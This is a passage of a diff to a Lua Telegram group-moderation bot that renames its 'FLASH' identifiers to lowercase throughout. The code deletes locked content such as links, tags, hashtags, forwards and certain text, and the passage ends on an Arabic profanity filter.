 delete_msg(chat,msgs)
 print("Deleted [Lock] [Link] [Audio]")
 end end
-if FLASHdx1:get(FLASH..'tags:lock'..msg.chat_id_) then
+if flashdx1:get(flash..'tags:lock'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2607,7 +2607,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Tag] [Audio]")
 end end
 if msg.content_.caption_:match("#") then
-if FLASHdx1:get(FLASH..'bot:hashtag:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:hashtag:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2615,7 +2615,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Hashtag] [Audio]")
 end end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if FLASHdx1:get(FLASH..'bot:webpage:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:webpage:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2623,7 +2623,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Web] [Audio]")
 end end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if FLASHdx1:get(FLASH..'bot:arabic:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:arabic:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2631,22 +2631,22 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Farsi] [Voice]")
 end end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if FLASHdx1:get(FLASH..'bot:english:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:english:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [English] [Audio]")
 end end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Voice
 elseif msg_type == 'MSG:Voice' then
 if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH..'anti-flood:'..msg.chat_id_) then
-FLASHdx1:setex(FLASH..pm, TIME_CHECK, msgs+1)
+if flashdx1:get(flash..'anti-flood:'..msg.chat_id_) then
+flashdx1:setex(flash..pm, TIME_CHECK, msgs+1)
 end
 if msg.forward_info_ then
-if FLASHdx1:get(FLASH..'bot:forward:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:forward:mute'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2654,7 +2654,7 @@ local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Fwd] [Voice]")
 end end end
-if FLASHdx1:get(FLASH..'bot:voice:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:voice:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2663,7 +2663,7 @@ print("Deleted [Lock] [Voice]")
 end
 if msg.content_.caption_ then
 check_filter_words(msg, msg.content_.caption_)
-if FLASHdx1:get(FLASH..'bot:links:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:links:mute'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2671,7 +2671,7 @@ local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Link] [Voice]")
 end end
-if FLASHdx1:get(FLASH..'tags:lock'..msg.chat_id_) then
+if flashdx1:get(flash..'tags:lock'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2680,7 +2680,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Tag] [Voice]")
 end end
 if msg.content_.caption_:match("#") then
-if FLASHdx1:get(FLASH..'bot:hashtag:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:hashtag:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2688,7 +2688,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Hashtag] [Voice]")
 end end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if FLASHdx1:get(FLASH..'bot:webpage:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:webpage:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2696,7 +2696,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Web] [Voice]")
 end end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if FLASHdx1:get(FLASH..'bot:arabic:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:arabic:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2704,22 +2704,22 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Farsi] [Voice]")
 end end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if FLASHdx1:get(FLASH..'bot:english:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:english:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [English] [Voice]")
 end end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Location
 elseif msg_type == 'MSG:Location' then
 if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH..'anti-flood:'..msg.chat_id_) then
-FLASHdx1:setex(FLASH..pm, TIME_CHECK, msgs+1)
+if flashdx1:get(flash..'anti-flood:'..msg.chat_id_) then
+flashdx1:setex(flash..pm, TIME_CHECK, msgs+1)
 end
 if msg.forward_info_ then
-if FLASHdx1:get(FLASH..'bot:forward:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:forward:mute'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2727,7 +2727,7 @@ local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [English] [Location]")
 end end end
-if FLASHdx1:get(FLASH..'bot:location:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:location:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2737,7 +2737,7 @@ return
 end
 if msg.content_.caption_ then
 check_filter_words(msg, msg.content_.caption_)
-if FLASHdx1:get(FLASH..'bot:links:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:links:mute'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2745,7 +2745,7 @@ local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Link] [Location]")
 end end
-if FLASHdx1:get(FLASH..'tags:lock'..msg.chat_id_) then
+if flashdx1:get(flash..'tags:lock'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2754,7 +2754,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Tag] [Location]")
 end end
 if msg.content_.caption_:match("#") then
-if FLASHdx1:get(FLASH..'bot:hashtag:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:hashtag:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2762,7 +2762,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Hashtag] [Location]")
 end end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if FLASHdx1:get(FLASH..'bot:webpage:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:webpage:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2770,7 +2770,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Web] [Location]")
 end end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if FLASHdx1:get(FLASH..'bot:arabic:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:arabic:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2778,22 +2778,22 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Farsi] [Location]")
 end end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if FLASHdx1:get(FLASH..'bot:english:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:english:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [English] [Location]")
 end end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Video
 elseif msg_type == 'MSG:Video' then
 if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH..'anti-flood:'..msg.chat_id_) then
-FLASHdx1:setex(FLASH..pm, TIME_CHECK, msgs+1)
+if flashdx1:get(flash..'anti-flood:'..msg.chat_id_) then
+flashdx1:setex(flash..pm, TIME_CHECK, msgs+1)
 end
 if msg.forward_info_ then
-if FLASHdx1:get(FLASH..'bot:forward:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:forward:mute'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2801,7 +2801,7 @@ local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Fwd] [Video]")
 end end end
-if FLASHdx1:get(FLASH..'bot:video:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:video:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2810,7 +2810,7 @@ print("Deleted [Lock] [Video]")
 end
 if msg.content_.caption_ then
 check_filter_words(msg, msg.content_.caption_)
-if FLASHdx1:get(FLASH..'bot:links:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:links:mute'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2818,7 +2818,7 @@ local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Link] [Video]")
 end end
-if FLASHdx1:get(FLASH..'tags:lock'..msg.chat_id_) then
+if flashdx1:get(flash..'tags:lock'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2827,7 +2827,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Tag] [Video]")
 end end
 if msg.content_.caption_:match("#") then
-if FLASHdx1:get(FLASH..'bot:hashtag:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:hashtag:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2835,7 +2835,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Hashtag] [Video]")
 end end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if FLASHdx1:get(FLASH..'bot:webpage:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:webpage:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2843,7 +2843,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Web] [Video] ")
 end end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if FLASHdx1:get(FLASH..'bot:arabic:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:arabic:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2851,22 +2851,22 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Farsi] [Video] ")
 end end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if FLASHdx1:get(FLASH..'bot:english:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:english:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [English] [Video]")
 end end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Gif
 elseif msg_type == 'MSG:Gif' then
 if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH..'anti-flood:'..msg.chat_id_) then
-FLASHdx1:setex(FLASH..pm, TIME_CHECK, msgs+1)
+if flashdx1:get(flash..'anti-flood:'..msg.chat_id_) then
+flashdx1:setex(flash..pm, TIME_CHECK, msgs+1)
 end
 if msg.forward_info_ then
-if FLASHdx1:get(FLASH..'bot:forward:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:forward:mute'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2874,7 +2874,7 @@ local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Fwd] [Gif]")
 end end end
-if FLASHdx1:get(FLASH..'bot:gifs:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:gifs:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2883,7 +2883,7 @@ print("Deleted [Lock] [Gif]")
 end
 if msg.content_.caption_ then
 check_filter_words(msg, msg.content_.caption_)
-if FLASHdx1:get(FLASH..'bot:links:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:links:mute'..msg.chat_id_) then
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2891,7 +2891,7 @@ local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Link] [Gif] ")
 end end
-if FLASHdx1:get(FLASH..'tags:lock'..msg.chat_id_) then
+if flashdx1:get(flash..'tags:lock'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2900,7 +2900,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Tag] [Gif]")
 end end
 if msg.content_.caption_:match("#") then
-if FLASHdx1:get(FLASH..'bot:hashtag:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:hashtag:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2908,7 +2908,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Hashtag] [Gif]")
 end end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") then
-if FLASHdx1:get(FLASH..'bot:webpage:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:webpage:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2916,7 +2916,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Web] [Gif]")
 end end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if FLASHdx1:get(FLASH..'bot:arabic:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:arabic:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2924,19 +2924,19 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Farsi] [Gif]")
 end end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if FLASHdx1:get(FLASH..'bot:english:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:english:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [English] [Gif]")
 end end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Text
 elseif msg_type == 'MSG:Text' then
 if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH..'anti-flood:'..msg.chat_id_) then
-FLASHdx1:setex(FLASH..pm, TIME_CHECK, msgs+1)
+if flashdx1:get(flash..'anti-flood:'..msg.chat_id_) then
+flashdx1:setex(flash..pm, TIME_CHECK, msgs+1)
 end end
 --vardump(msg)
 function check_username(extra,result,success)
@@ -2944,10 +2944,10 @@ function check_username(extra,result,success)
 local username = (result.username_ or '')
 local svuser = 'user:'..result.id_
 if username then
-FLASHdx1:hset(svuser, 'username', username)
+flashdx1:hset(svuser, 'username', username)
 end
 if username and username:match("[Bb][Oo][Tt]$") or username:match("_[Bb][Oo][Tt]$") then
-if FLASHdx1:get(FLASH..'bot:bots:gkgk'..msg.chat_id_) and not is_momod(msg.chat_id_, msg.chat_id_) then
+if flashdx1:get(flash..'bot:bots:gkgk'..msg.chat_id_) and not is_momod(msg.chat_id_, msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2958,21 +2958,21 @@ chat_kick(msg.chat_id_, bots[i].user_id_)
 return false
 end end end
 getUser(msg.sender_user_id_,check_username)
-FLASHdx1:set(FLASH..'bot:editid'.. msg.id_,msg.content_.text_)
+flashdx1:set(flash..'bot:editid'.. msg.id_,msg.content_.text_)
 if not is_free(msg, msg.content_.text_) then
 if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
 check_filter_words(msg,text)
 if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
-if FLASHdx1:get(FLASH..'bot:links:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:links:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Link] [Text]")
-if FLASHdx1:get(FLASH..'bot:strict'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:strict'..msg.chat_id_) then
 chat_kick(msg.chat_id_, msg.sender_user_id_)
 end end end
-if FLASHdx1:get(FLASH..'bot:text:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:text:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2980,7 +2980,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Text]")
 end
 if msg.forward_info_ then
-if FLASHdx1:get(FLASH..'bot:forward:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:forward:mute'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 local id = msg.id_
 local msgs = {[0] = id}
@@ -2989,7 +2989,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Fwd] [Text]")
 end end end
 if msg.content_.text_:match("@") then
-if FLASHdx1:get(FLASH..'tags:lock'..msg.chat_id_) then
+if flashdx1:get(flash..'tags:lock'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -2997,7 +2997,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Tag] [Text]")
 end end
 if msg.content_.text_:match("#") then
-if FLASHdx1:get(FLASH..'bot:hashtag:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:hashtag:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -3005,7 +3005,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Hashtag] [Text]")
 end end
 if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if FLASHdx1:get(FLASH..'bot:webpage:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:webpage:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -3013,7 +3013,7 @@ delete_msg(chat,msgs)
 print("Deleted [Lock] [Web] [Text]")
 end end
 if msg.content_.text_:match("[\216-\219][\128-\191]") then
-if FLASHdx1:get(FLASH..'bot:arabic:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:arabic:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
@@ -3027,56 +3027,56 @@ local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 local hash = 'bot:sens:spam'..msg.chat_id_
-if not FLASHdx1:get(FLASH..hash) then
+if not flashdx1:get(flash..hash) then
 sens = 400
 else
-sens = tonumber(FLASHdx1:get(FLASH..hash))
+sens = tonumber(flashdx1:get(flash..hash))
 end
-if FLASHdx1:get(FLASH..'bot:spam:mute'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
+if flashdx1:get(flash..'bot:spam:mute'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
 delete_msg(chat,msgs)
 print("Deleted [Lock] [Spam] ")
 end end
 if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
-if FLASHdx1:get(FLASH..'bot:english:mute'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:english:mute'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)
 print("Deleted [Lock] [English] [Text]")
 end end end end
---     By Developer FLASH     -- 
-if FLASHdx1:get(FLASH.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_) then
+--     By Developer flash     -- 
+if flashdx1:get(flash.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_) then
 if text == "الغاء" then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ الرابط .', 1, 'md')
-FLASHdx1:del(FLASH.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_) 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ الرابط .', 1, 'md')
+flashdx1:del(flash.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_) 
 return false
 end
 if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
 local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
-FLASHdx1:set(FLASH.."bot:group:link"..msg.chat_id_,Link)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم صنع الرابط الجديد .\n❅∫ ارسل (الرابط) لعرض الرابط .', 1, 'md')
-FLASHdx1:del(FLASH.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_) 
+flashdx1:set(flash.."bot:group:link"..msg.chat_id_,Link)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم صنع الرابط الجديد .\n❅∫ ارسل (الرابط) لعرض الرابط .', 1, 'md')
+flashdx1:del(flash.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_) 
 return false 
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local msg = data.message_
 text = msg.content_.text_
 if text and is_monsh(msg.sender_user_id_, msg.chat_id_) then 
-if FLASHdx1:get('FLASH:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
+if flashdx1:get('flash:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
-FLASHdx1:del('FLASH:'..bot_id..'id:user'..msg.chat_id_)  
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء الامر .', 1, 'md')
-FLASHdx1:del('FLASH:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
+flashdx1:del('flash:'..bot_id..'id:user'..msg.chat_id_)  
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء الامر .', 1, 'md')
+flashdx1:del('flash:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 return false  end 
-FLASHdx1:del('FLASH:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
+flashdx1:del('flash:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 local numadded = string.match(text, "(%d+)") 
-local iduserr = FLASHdx1:get('FLASH:'..bot_id..'id:user'..msg.chat_id_)  
-FLASHdx1:incrby('FLASH:'..bot_id..'nummsg'..msg.chat_id_..iduserr,numadded)  
-FLASHdx(msg.chat_id_, msg.id_,  1, "❅∫ تم اضافه له *{ "..numadded..' }* رساله . ', 1, 'md')
+local iduserr = flashdx1:get('flash:'..bot_id..'id:user'..msg.chat_id_)  
+flashdx1:incrby('flash:'..bot_id..'nummsg'..msg.chat_id_..iduserr,numadded)  
+flashdx(msg.chat_id_, msg.id_,  1, "❅∫ تم اضافه له *{ "..numadded..' }* رساله . ', 1, 'md')
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text:match("طيز") or text:match("ديس") or text:match("كس") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("صرم") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") or text:match("كوس") then
